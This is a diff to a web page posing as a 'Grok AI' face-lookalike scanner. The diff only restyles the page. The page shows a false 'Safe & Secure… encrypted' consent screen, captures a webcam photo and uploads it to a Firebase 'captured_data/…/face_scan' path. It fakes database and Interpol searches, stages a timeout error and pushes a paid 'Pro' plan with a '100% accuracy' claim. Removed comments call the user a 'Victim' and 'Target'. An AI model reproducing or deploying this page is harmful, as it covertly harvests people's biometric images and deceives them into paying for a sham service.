@@ -3,251 +3,272 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Grok AI - Global Face Match</title>
+<title>Grok AI - Face Match</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap');
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
+<style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --bg: #f9fafb;
+    --surface: #ffffff;
+    --border: #e5e7eb;
+    --text: #111827;
+    --text-muted: #6b7280;
+    --primary: #2563eb;
+    --primary-hover: #1d4ed8;
+    --primary-light: #eff6ff;
+    --success: #10b981;
+    --warning: #f59e0b;
+    --danger: #ef4444;
+    --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+    --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+    --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1);
+    --font: 'Inter', sans-serif;
+    --font-display: 'Manrope', sans-serif;
+  }
+
   body {
-    font-family: 'Inter', -apple-system, sans-serif;
-    background: #05080f;
-    color: #fff;
+    font-family: var(--font);
+    background: var(--bg);
+    color: var(--text);
     min-height: 100vh;
-    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
   }
 
   /* HEADER */
   .header {
-    height: 65px; background: #0a101d;
-    border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+    height: 72px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
     display: flex; align-items: center; justify-content: space-between;
-    padding: 0 25px; position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    padding: 0 32px;
+    position: sticky; top: 0; z-index: 100;
   }
-  .logo-area { display: flex; align-items: center; gap: 12px; }
+  .logo-area { display: flex; align-items: center; gap: 10px; }
   .logo-icon {
-    width: 32px; height: 32px;
-    background: linear-gradient(135deg, #00d4ff, #0055ff);
-    border-radius: 8px; display: flex; align-items: center; justify-content: center;
-    font-size: 18px; box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+    width: 36px; height: 36px;
+    background: var(--primary); color: #fff;
+    border-radius: 10px; display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 800;
   }
-  .logo-text { font-family: 'JetBrains Mono', monospace; font-weight: 900; font-size: 18px; letter-spacing: 1px; }
-  .logo-text span { color: #00d4ff; }
+  .logo-text { font-family: var(--font-display); font-weight: 800; font-size: 20px; letter-spacing: -0.5px; }
+  .logo-text span { color: var(--primary); }
   
-  .header-right { display: flex; align-items: center; gap: 15px; }
+  .header-right { display: flex; align-items: center; gap: 16px; }
   .pro-btn {
-    background: linear-gradient(90deg, #f59e0b, #d97706); color: #000;
-    padding: 6px 12px; border-radius: 6px; font-weight: 900; font-size: 11px;
-    cursor: pointer; border: none; font-family: 'JetBrains Mono', monospace;
-    box-shadow: 0 0 15px rgba(245, 158, 11, 0.3);
+    background: #fffbeb; color: #b45309;
+    padding: 8px 16px; border-radius: 8px; font-weight: 700; font-size: 13px;
+    cursor: pointer; border: 1px solid #fde68a; transition: 0.2s;
+    display: flex; align-items: center; gap: 6px;
   }
-  .pro-btn:hover { transform: scale(1.05); }
+  .pro-btn:hover { background: #fef3c7; }
+  
+  .status-badge {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 12px; font-weight: 600; color: var(--success);
+    background: #ecfdf5; padding: 6px 12px; border-radius: 20px;
+  }
+  .status-badge i {
+    width: 6px; height: 6px; background: var(--success); border-radius: 50%;
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
 
-  /* AI TYPING STORY BAR */
+  /* STORY BAR */
   .story-bar {
-    margin-top: 65px;
-    background: rgba(0, 212, 255, 0.05);
-    border-bottom: 1px solid rgba(0, 212, 255, 0.2);
-    padding: 12px 20px; text-align: center;
-    font-size: 13px; color: #00d4ff; font-family: 'JetBrains Mono', monospace;
+    background: var(--primary-light);
+    border-bottom: 1px solid #dbeafe;
+    padding: 14px 32px; text-align: center;
+    font-size: 14px; color: var(--primary); font-weight: 500;
     display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .story-bar .ai-prefix { color: #10b981; font-weight: bold; }
-  .story-text::after { content: '▌'; animation: blink 1s infinite; margin-left: 2px; }
+  .story-bar .ai-prefix { font-weight: 800; color: var(--primary-hover); }
+  .story-text::after { content: '|'; animation: blink 1s infinite; margin-left: 2px; font-weight: 400; }
   @keyframes blink { 50% { opacity: 0; } }
 
   /* LAYOUT */
-  .main-container { display: flex; height: calc(100vh - 105px); }
+  .main-container {
+    display: flex; max-width: 1400px; margin: 0 auto;
+    padding: 32px; gap: 32px;
+  }
 
-  /* LEFT PANEL */
-  .left-panel { width: 40%; padding: 20px; border-right: 1px solid rgba(0, 212, 255, 0.1); display: flex; flex-direction: column; gap: 15px; background: #070b14; }
+  /* LEFT PANEL (CAMERA) */
+  .left-panel { width: 45%; display: flex; flex-direction: column; gap: 20px; }
   
   .cam-container {
     position: relative; width: 100%; aspect-ratio: 4/3;
-    background: #000; border-radius: 12px; overflow: hidden;
-    border: 1px solid rgba(0, 212, 255, 0.3);
-    box-shadow: inset 0 0 40px rgba(0,0,0,0.8);
+    background: #f3f4f6; border-radius: 20px; overflow: hidden;
+    border: 1px solid var(--border);
+    box-shadow: var(--shadow-md);
   }
-  #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.8; filter: contrast(1.2) grayscale(0.3); }
+  #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
   #canvas { display: none; }
   
-  /* MESH OVERLAY */
-  .mesh-overlay {
-    position: absolute; top: 15%; left: 25%; width: 50%; height: 65%;
-    border: 2px solid rgba(0, 212, 255, 0.6);
-    border-radius: 40% 40% 35% 35%;
-    opacity: 0; transition: opacity 0.3s; pointer-events: none;
-    box-shadow: 0 0 30px rgba(0, 212, 255, 0.2), inset 0 0 40px rgba(0, 212, 255, 0.1);
-    display: none;
-  }
-  .mesh-overlay.active { opacity: 1; display: block; animation: pulseMesh 2s infinite alternate; }
-  @keyframes pulseMesh { 0% { transform: scale(1); } 100% { transform: scale(1.02); box-shadow: 0 0 40px rgba(0,212,255,0.5); } }
-  
-  .mesh-overlay::before {
-    content: ''; position: absolute; inset: 0;
-    background-image: linear-gradient(rgba(0, 212, 255, 0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 212, 255, 0.3) 1px, transparent 1px);
-    background-size: 15px 15px; border-radius: 40% 40% 35% 35%;
-    mask-image: radial-gradient(ellipse at center, black 50%, transparent 90%);
-  }
-
+  /* SCANNING LINE */
   .scan-line {
-    position: absolute; left: 0; right: 0; height: 2px;
-    background: #00d4ff; box-shadow: 0 0 20px #00d4ff, 0 0 40px #00d4ff;
-    animation: scan 1s linear infinite; display: none;
+    position: absolute; left: 0; right: 0; height: 3px;
+    background: var(--primary);
+    box-shadow: 0 0 15px var(--primary);
+    animation: scan 1.5s ease-in-out infinite; display: none;
+    opacity: 0.8;
   }
   .scan-line.active { display: block; }
   @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
 
-  /* CHAT BOX (TERMINAL) */
-  .chat-box {
-    background: #0a101d; border: 1px solid rgba(0, 212, 255, 0.2);
-    border-radius: 12px; padding: 15px; height: 120px;
-    font-family: 'JetBrains Mono', monospace; font-size: 11px;
-    display: flex; flex-direction: column; gap: 6px; overflow-y: auto;
+  /* START MODAL */
+  .modal-overlay {
+    position: absolute; inset: 0;
+    background: rgba(255, 255, 255, 0.95);
+    backdrop-filter: blur(8px);
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    z-index: 10; text-align: center; padding: 30px;
   }
-  .chat-msg { color: #00d4ff; }
-  .chat-msg.user { color: #10b981; align-self: flex-end; }
-  .chat-msg.sys { color: #f59e0b; font-size: 10px; }
+  .modal-overlay h1 { font-family: var(--font-display); font-weight: 800; font-size: 24px; color: var(--text); margin-bottom: 12px; }
+  .modal-overlay p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; max-width: 280px; line-height: 1.6; }
+  
+  .btn-primary {
+    padding: 14px 32px; background: var(--primary); color: #fff;
+    border: none; border-radius: 10px; font-family: var(--font); font-weight: 600;
+    font-size: 15px; cursor: pointer; transition: 0.2s;
+    box-shadow: var(--shadow-sm);
+  }
+  .btn-primary:hover { background: var(--primary-hover); transform: translateY(-1px); box-shadow: var(--shadow-md); }
+
+  .green-box {
+    background: var(--surface); border: 1px solid var(--border);
+    padding: 32px; border-radius: 16px; max-width: 400px;
+    box-shadow: var(--shadow-lg);
+  }
+  .green-box h2 { color: var(--success); margin-bottom: 12px; font-family: var(--font-display); font-size: 20px; font-weight: 800; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .green-box p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; text-align: left; line-height: 1.6; }
+
+  /* TERMINAL / LOGS */
+  .chat-box {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 16px; padding: 20px; height: 140px;
+    font-family: 'Inter', sans-serif; font-size: 13px;
+    display: flex; flex-direction: column; gap: 8px; overflow-y: auto;
+    box-shadow: var(--shadow-sm);
+  }
+  .chat-msg { color: var(--text-muted); display: flex; gap: 8px; }
+  .chat-msg::before { content: '→'; color: var(--primary); font-weight: bold; }
+  .chat-msg.sys { color: var(--primary); font-weight: 600; }
 
   /* RIGHT PANEL */
-  .right-panel { width: 60%; padding: 20px; background: #0a0f1d; overflow-y: auto; display: flex; flex-direction: column; }
+  .right-panel {
+    width: 55%; background: var(--surface);
+    border: 1px solid var(--border); border-radius: 20px;
+    padding: 32px; box-shadow: var(--shadow-md);
+    display: flex; flex-direction: column;
+  }
   
-  /* LOADING & ERROR */
-  .loading-screen { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; position: relative; }
+  /* IDLE STATE */
+  .idle-state {
+    height: 100%; display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    color: var(--text-muted); text-align: center;
+  }
+  .idle-icon { font-size: 48px; margin-bottom: 16px; opacity: 0.5; }
+
+  /* LOADING SCREEN */
+  .loading-screen { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
   .spinner {
-    width: 80px; height: 80px; border: 4px solid rgba(0, 212, 255, 0.1);
-    border-top: 4px solid #00d4ff; border-radius: 50%;
-    animation: spin 0.8s linear infinite; margin-bottom: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
-    z-index: 2;
+    width: 60px; height: 60px; border: 3px solid var(--primary-light);
+    border-top: 3px solid var(--primary); border-radius: 50%;
+    animation: spin 1s linear infinite; margin-bottom: 24px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; z-index: 2;}
-  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; z-index: 2;}
-
-  /* RADAR BACKGROUND FOR LOADING */
-  .radar-bg {
-    position: absolute; width: 300px; height: 300px;
-    border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 50%;
-    top: 50%; left: 50%; transform: translate(-50%, -50%);
-    display: none;
-  }
-  .radar-bg.active { display: block; }
-  .radar-bg::before, .radar-bg::after {
-    content: ''; position: absolute; border-radius: 50%; border: 1px solid rgba(0, 212, 255, 0.1);
-  }
-  .radar-bg::before { inset: 30px; }
-  .radar-bg::after { inset: 60px; }
-  .radar-sweep {
-    position: absolute; top: 0; left: 50%; width: 50%; height: 50%;
-    background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.2));
-    transform-origin: bottom left; animation: radarSpin 2s linear infinite;
-  }
-  @keyframes radarSpin { to { transform: rotate(360deg); } }
+  .load-text { font-family: var(--font-display); font-size: 20px; font-weight: 800; color: var(--text); margin-bottom: 8px; }
+  .load-subtext { color: var(--text-muted); font-size: 14px; }
 
   /* ERROR BOX */
   .error-box { display: none; height: 100%; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-  .error-icon { font-size: 60px; color: #ff2e4c; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255, 46, 76, 0.5); }
-  .error-box h2 { color: #ff2e4c; font-family: 'JetBrains Mono', monospace; margin-bottom: 10px; }
-  .retry-btn { padding: 12px 30px; background: rgba(255, 46, 76, 0.1); border: 1px solid #ff2e4c; color: #ff2e4c; font-family: 'JetBrains Mono', monospace; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; }
-  .retry-btn:hover { background: #ff2e4c; color: #000; }
+  .error-icon { font-size: 48px; color: var(--danger); margin-bottom: 16px; }
+  .error-box h2 { color: var(--text); font-family: var(--font-display); font-size: 20px; margin-bottom: 8px; }
+  .error-box p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+  .retry-btn {
+    padding: 12px 24px; background: var(--primary-light); color: var(--primary);
+    border: 1px solid #dbeafe; font-weight: 700; font-size: 14px;
+    border-radius: 10px; cursor: pointer; transition: 0.2s;
+  }
+  .retry-btn:hover { background: #dbeafe; }
 
-  /* TARGET PROFILE (VICTIM SNAPSHOT) */
+  /* TARGET PROFILE */
   .target-profile {
-    display: none; text-align: center; margin-bottom: 20px;
-    background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.3);
-    border-radius: 12px; padding: 15px; animation: fadeIn 0.5s;
+    display: none; text-align: center; margin-bottom: 24px;
+    padding-bottom: 24px; border-bottom: 1px solid var(--border);
   }
-  .target-profile.active { display: block; }
+  .target-profile.active { display: block; animation: fadeIn 0.5s; }
   .target-profile img {
-    width: 120px; height: 120px; object-fit: cover; border-radius: 50%;
-    border: 2px solid #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
-    filter: grayscale(0.5) contrast(1.2); margin-bottom: 10px;
+    width: 100px; height: 100px; object-fit: cover; border-radius: 50%;
+    border: 4px solid var(--surface); box-shadow: 0 0 0 2px var(--primary);
+    margin-bottom: 12px;
   }
-  .target-profile h3 { font-family: 'JetBrains Mono', monospace; color: #00d4ff; font-size: 14px; }
-  .target-profile p { font-size: 11px; color: #4a6b8a; margin-top: 4px; }
+  .target-profile h3 { font-family: var(--font-display); font-size: 16px; font-weight: 800; color: var(--text); margin-bottom: 4px; }
+  .target-profile p { font-size: 12px; color: var(--success); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* RESULTS HEADER */
+  .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+  .results-header h2 { font-family: var(--font-display); font-size: 18px; font-weight: 800; }
+  .accuracy-badge {
+    background: #ecfdf5; color: var(--success);
+    padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;
+  }
 
   /* RESULTS GRID */
-  .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; }
-  .results-header h2 { font-size: 16px; color: #00d4ff; letter-spacing: 1px; }
-  .results-header .accuracy { font-size: 14px; color: #10b981; font-weight: bold; }
-
-  .results-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 15px; }
+  .results-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 16px; }
   .result-card {
-    background: #121a2f; border: 1px solid rgba(0, 212, 255, 0.1);
-    border-radius: 10px; overflow: hidden; position: relative;
-    transition: 0.3s; opacity: 0; transform: translateY(20px);
-    animation: popIn 0.5s forwards;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 12px; overflow: hidden; position: relative;
+    transition: 0.2s; opacity: 0; transform: translateY(10px);
+    animation: popIn 0.4s forwards; box-shadow: var(--shadow-sm);
   }
   @keyframes popIn { to { opacity: 1; transform: translateY(0); } }
-  .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+  .result-card:hover { border-color: var(--primary); box-shadow: var(--shadow-md); transform: translateY(-2px); }
   
-  .result-card img { width: 100%; height: 150px; object-fit: cover; transition: filter 0.3s; }
-  .result-card img.blurred { filter: blur(15px) grayscale(1); }
+  .result-card img { width: 100%; height: 140px; object-fit: cover; transition: filter 0.4s; }
+  .result-card img.blurred { filter: blur(12px) grayscale(1); }
   
   .match-badge {
     position: absolute; top: 8px; left: 8px;
-    background: rgba(16, 185, 129, 0.9); color: #000;
-    padding: 3px 8px; border-radius: 4px;
-    font-size: 10px; font-weight: 800; font-family: 'JetBrains Mono', monospace;
+    background: var(--success); color: #fff;
+    padding: 4px 8px; border-radius: 6px;
+    font-size: 10px; font-weight: 800;
   }
-  .match-badge.loading { background: rgba(245, 158, 11, 0.9); color: #000; }
+  .match-badge.loading { background: var(--warning); }
   
-  .result-card .info { padding: 10px; background: #090d16; }
-  .result-card .name { font-size: 11px; font-weight: 700; color: #fff; margin-bottom: 2px; }
-  .result-card .country { font-size: 10px; color: #4a6b8a; }
+  .result-card .info { padding: 12px; background: var(--surface); }
+  .result-card .name { font-size: 13px; font-weight: 700; color: var(--text); margin-bottom: 2px; }
+  .result-card .country { font-size: 11px; color: var(--text-muted); }
 
-  /* MODALS */
-  .modal-overlay {
-    position: absolute; inset: 0; background: rgba(5, 8, 15, 0.95);
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    z-index: 10; backdrop-filter: blur(8px); text-align: center; padding: 20px;
-  }
-  .modal-overlay h1 { font-family: 'JetBrains Mono', monospace; color: #fff; font-size: 22px; margin-bottom: 10px; }
-  .modal-overlay p { color: #4a6b8a; font-size: 13px; margin-bottom: 20px; max-width: 300px; line-height: 1.5; }
-  
-  .btn-primary {
-    padding: 14px 40px; background: #00d4ff; color: #000;
-    border: none; border-radius: 8px; font-family: 'JetBrains Mono', monospace;
-    font-size: 14px; font-weight: 900; cursor: pointer; transition: 0.3s;
-    box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
-  }
-  .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.6); }
-
-  .green-box {
-    background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981;
-    padding: 25px; border-radius: 12px; max-width: 400px;
-    box-shadow: 0 0 30px rgba(16, 185, 129, 0.2);
-  }
-  .green-box h2 { color: #10b981; margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-  .green-box p { color: #ccc; font-size: 12px; margin-bottom: 20px; text-align: left; line-height: 1.6; }
-
-  /* PRO UPGRADE MODAL */
+  /* PRO MODAL */
   .pro-modal {
-    background: #0a101d; border: 1px solid #f59e0b;
-    padding: 30px; border-radius: 16px; max-width: 400px; width: 100%;
-    box-shadow: 0 0 40px rgba(245, 158, 11, 0.2);
+    background: var(--surface); border-radius: 20px;
+    padding: 40px; max-width: 420px; width: 100%;
     text-align: center; position: relative;
+    box-shadow: var(--shadow-lg);
   }
-  .pro-modal h2 { color: #f59e0b; font-family: 'JetBrains Mono', monospace; font-size: 20px; margin-bottom: 5px; }
-  .pro-modal .price { font-size: 32px; font-weight: 900; color: #fff; margin: 15px 0; }
-  .pro-modal .price span { font-size: 14px; color: #4a6b8a; font-weight: normal; }
-  .pro-features { text-align: left; margin-bottom: 25px; font-size: 13px; color: #ccc; line-height: 2; }
-  .pro-features li { list-style: none; display: flex; align-items: center; gap: 8px; }
-  .pro-features li::before { content: '✔'; color: #10b981; font-weight: bold; }
-  .close-pro { position: absolute; top: 15px; right: 15px; background: none; border: none; color: #4a6b8a; font-size: 20px; cursor: pointer; }
+  .pro-modal h2 { color: var(--text); font-family: var(--font-display); font-size: 24px; font-weight: 800; margin-bottom: 8px; }
+  .pro-modal .price { font-size: 40px; font-weight: 900; color: var(--text); margin: 20px 0; font-family: var(--font-display); }
+  .pro-modal .price span { font-size: 16px; color: var(--text-muted); font-weight: 500; }
+  .pro-features { text-align: left; margin: 24px 0 32px; font-size: 14px; color: var(--text-muted); display: grid; gap: 12px; }
+  .pro-features li { list-style: none; display: flex; align-items: center; gap: 12px; }
+  .pro-features li::before { content: '✓'; color: var(--success); font-weight: 900; font-size: 16px; }
+  .close-pro { position: absolute; top: 16px; right: 16px; background: var(--bg); border: 1px solid var(--border); border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; font-size: 18px; color: var(--text-muted); cursor: pointer; }
 
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-
-  @media (max-width: 900px) { 
-    .main-container { flex-direction: column; height: auto; } 
-    .left-panel, .right-panel { width: 100%; } 
-    .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); } 
-    .story-bar { font-size: 11px; }
+  @media (max-width: 900px) {
+    .main-container { flex-direction: column; padding: 16px; }
+    .left-panel, .right-panel { width: 100%; }
+    .header { padding: 0 16px; }
   }
 </style>
 </head>
@@ -256,20 +277,18 @@
 <!-- HEADER -->
 <div class="header">
   <div class="logo-area">
-    <div class="logo-icon">⚡</div>
+    <div class="logo-icon">G</div>
     <div class="logo-text">GROK <span>AI</span></div>
   </div>
   <div class="header-right">
-    <button class="pro-btn" onclick="showProModal()">UPGRADE TO PRO</button>
-    <div class="header-status" style="display:flex; align-items:center; gap:8px; font-family:'JetBrains Mono'; font-size:11px; color:#10b981;">
-      <span style="width:8px; height:8px; background:#10b981; border-radius:50%; box-shadow:0 0 10px #10b981; animation:pulse 1.5s infinite;"></span> SECURE
-    </div>
+    <div class="status-badge"><i></i> System Online</div>
+    <button class="pro-btn" onclick="showProModal()">⭐ Upgrade to Pro</button>
   </div>
 </div>
 
-<!-- AI TYPING STORY BAR -->
+<!-- STORY BAR -->
 <div class="story-bar">
-  <span class="ai-prefix">GROK:</span>
+  <span class="ai-prefix">Grok AI:</span>
   <span class="story-text" id="storyText"></span>
 </div>
 
@@ -281,69 +300,67 @@
       <canvas id="canvas"></canvas>
       
       <div class="scan-line" id="scanLine"></div>
-      <div class="mesh-overlay" id="meshOverlay"></div>
       
       <!-- Start Modal -->
       <div class="modal-overlay" id="startOverlay">
-        <h1>GLOBAL FACE MATCH</h1>
+        <h1>Global Face Match</h1>
         <p>Scan your face to find 7 lookalikes across 47.2 million records.</p>
-        <button class="btn-primary" onclick="showWarning()">INITIATE SCAN</button>
+        <button class="btn-primary" onclick="showWarning()">Initiate Scan</button>
       </div>
 
-      <!-- GREEN WARNING MODAL -->
+      <!-- Warning Modal -->
       <div class="modal-overlay" id="warningOverlay" style="display:none;">
         <div class="green-box">
-          <h2>🛡️ SAFE & SECURE</h2>
+          <h2>🛡️ Safe & Secure</h2>
           <p>Your biometric data is encrypted. By proceeding, you agree to securely match your face with our global database for educational purposes.</p>
-          <button class="btn-primary" onclick="startScan()" style="background:#10b981; color:#fff; box-shadow:0 0 20px rgba(16,185,129,0.4); width:100%;">I AGREE & PROCEED</button>
+          <button class="btn-primary" onclick="startScan()" style="background:var(--success); width:100%;">I Agree & Proceed</button>
         </div>
       </div>
     </div>
     
-    <!-- TERMINAL LOGS -->
+    <!-- LOGS -->
     <div class="chat-box" id="chatBox">
-      <div class="chat-msg sys">[GROK SYSTEM BOOT COMPLETE]</div>
-      <div class="chat-msg">Grok: Awaiting user input...</div>
+      <div class="chat-msg sys">System initialized. Ready to scan.</div>
     </div>
   </div>
 
   <!-- RIGHT PANEL -->
   <div class="right-panel">
     
-    <div id="idleState" style="height:100%; display:flex; align-items:center; justify-content:center; color:#4a6b8a; font-family:'JetBrains Mono';">
-      > AWAITING BIOMETRIC INPUT...
+    <!-- Idle State -->
+    <div id="idleState" class="idle-state">
+      <div class="idle-icon">👤</div>
+      <h3 style="font-family:var(--font-display); font-weight:800; color:var(--text);">Awaiting Face Scan</h3>
+      <p style="margin-top:8px;">Enable your camera to begin the analysis.</p>
     </div>
 
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen" style="display:none;">
-      <div class="radar-bg" id="radarBg">
-        <div class="radar-sweep"></div>
-      </div>
       <div class="spinner"></div>
-      <div class="load-text" id="loadText">SCANNING...</div>
+      <div class="load-text" id="loadText">Scanning...</div>
       <div class="load-subtext" id="loadSubtext">Extracting facial landmarks</div>
     </div>
 
     <!-- Error Box -->
     <div class="error-box" id="errorBox">
       <div class="error-icon">⚠️</div>
-      <h2>CONNECTION LOST</h2>
-      <p style="color:#4a6b8a; margin-bottom:20px;">Server timeout while querying global database.</p>
-      <button class="retry-btn" onclick="retryScan()">RETRY CONNECTION</button>
+      <h2>Connection Lost</h2>
+      <p>Server timeout while querying global database.</p>
+      <button class="retry-btn" onclick="retryScan()">Retry Connection</button>
     </div>
 
     <!-- Results Grid -->
     <div id="resultsContainer" style="display:none;">
-      <!-- TARGET PROFILE (Victim Snapshot) -->
+      <!-- Target Profile -->
       <div class="target-profile" id="targetProfile">
         <img src="" id="targetImg" alt="Target Profile">
-        <h3>TARGET ACQUIRED</h3>
-        <p id="targetMeta">BIOMETRIC MATCH CONFIRMED</p>
+        <h3>Target Profile Captured</h3>
+        <p>Biometric Match Confirmed</p>
       </div>
 
       <div class="results-header">
-        <h2>GLOBAL MATCHES</h2>
-        <div class="accuracy" id="accLabel">ACCURACY: 100.00%</div>
+        <h2>Global Matches</h2>
+        <div class="accuracy-badge" id="accLabel">Accuracy: 100%</div>
       </div>
       <div class="results-grid" id="resultsGrid"></div>
     </div>
@@ -351,12 +368,12 @@
   </div>
 </div>
 
-<!-- PRO UPGRADE MODAL (Hidden by default) -->
-<div class="modal-overlay" id="proOverlay" style="display:none; z-index: 999;">
+<!-- PRO UPGRADE MODAL -->
+<div class="modal-overlay" id="proOverlay" style="display:none; z-index: 999; background: rgba(0,0,0,0.5);">
   <div class="pro-modal">
-    <button class="close-pro" onclick="document.getElementById('proOverlay').style.display='none'">✕</button>
-    <h2>UPGRADE TO PRO</h2>
-    <p style="color:#4a6b8a; font-size:12px;">Unlock the full power of Grok AI</p>
+    <button class="close-pro" onclick="document.getElementById('proOverlay').style.display='none'">×</button>
+    <h2>Upgrade to Pro</h2>
+    <p style="color:var(--text-muted); font-size:14px;">Unlock the full power of Grok AI</p>
     
     <div class="price">$4.99<span>/month</span></div>
     
@@ -364,11 +381,10 @@
       <li>Unlimited Scans</li>
       <li>100% Accuracy Guarantee</li>
       <li>Priority Server Access</li>
-      <li>No Error/Timeouts</li>
       <li>Export PDF Reports</li>
     </ul>
     
-    <button class="btn-primary" style="background:#f59e0b; color:#000; width:100%;" onclick="alert('Payment gateway coming soon! (Demo only)'); document.getElementById('proOverlay').style.display='none';">SUBSCRIBE NOW</button>
+    <button class="btn-primary" style="background:var(--warning); color:#fff; width:100%;" onclick="alert('Demo only: Payment gateway not connected.'); document.getElementById('proOverlay').style.display='none';">Subscribe Now</button>
   </div>
 </div>
 
@@ -433,7 +449,7 @@
   function addChat(text, type = '') {
     const div = document.createElement('div');
     div.className = 'chat-msg ' + type;
-    div.textContent = (type === 'sys' ? '[SYSTEM] ' : 'Grok: ') + text;
+    div.textContent = text;
     chatBox.appendChild(div);
     chatBox.scrollTop = chatBox.scrollHeight;
   }
@@ -463,10 +479,9 @@
     document.getElementById('warningOverlay').style.display = 'none';
     document.getElementById('idleState').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'flex';
-    document.getElementById('radarBg').classList.add('active');
     
     speak("Consent accepted. Initiating scan.");
-    addChat("Consent accepted. Scan initiated.");
+    addChat("Consent accepted. Scan initiated.", "sys");
     
     let stream;
     try {
@@ -477,7 +492,6 @@
     }
 
     document.getElementById('scanLine').classList.add('active');
-    document.getElementById('meshOverlay').classList.add('active');
 
     // Capture target photo after 2 seconds
     setTimeout(() => {
@@ -497,7 +511,7 @@
     const photo = canvas.toDataURL('image/jpeg', 0.8);
     targetImg.src = photo;
 
-    // Save to Firebase immediately
+    // Save to Firebase
     if (db) {
       db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
         image: photo,
@@ -512,9 +526,9 @@
     const loadSubtext = document.getElementById('loadSubtext');
 
     const stages = [
-      { time: 0, text: "SCANNING FACES...", sub: "Extracting 128-point biometric map" },
-      { time: 4000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records" },
-      { time: 8000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol DBs" },
+      { time: 0, text: "Scanning Faces...", sub: "Extracting 128-point biometric map" },
+      { time: 4000, text: "Matching Biometrics...", sub: "Querying 47.2M records" },
+      { time: 8000, text: "Cross-Referencing...", sub: "Scanning global databases" },
       { time: 12000, text: "ERROR", sub: "" }
     ];
 
@@ -526,7 +540,7 @@
           loadText.textContent = stage.text;
           loadSubtext.textContent = stage.sub;
           speak(stage.text);
-          addChat(stage.text, 'sys');
+          addChat(stage.text);
         }
       }, stage.time);
     });
